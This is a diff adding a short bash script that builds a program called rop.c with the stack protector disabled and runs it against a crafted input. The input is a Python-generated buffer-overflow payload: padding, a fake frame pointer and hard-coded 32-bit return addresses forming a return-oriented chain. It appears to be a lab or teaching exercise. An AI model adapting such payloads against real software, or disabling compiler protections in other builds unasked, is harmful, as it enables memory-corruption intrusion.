@@ -1,0 +1,9 @@
+#!/bin/bash
+
+set -e
+
+# build vuln
+gcc -g -fno-stack-protector -o rop rop.c
+
+# run
+./rop "$(python -c 'print "A"*0x6c + "BBBB" + "\x50\x83\x04\x08" + "CCCC" + "\x90\x85\x04\x08"')"
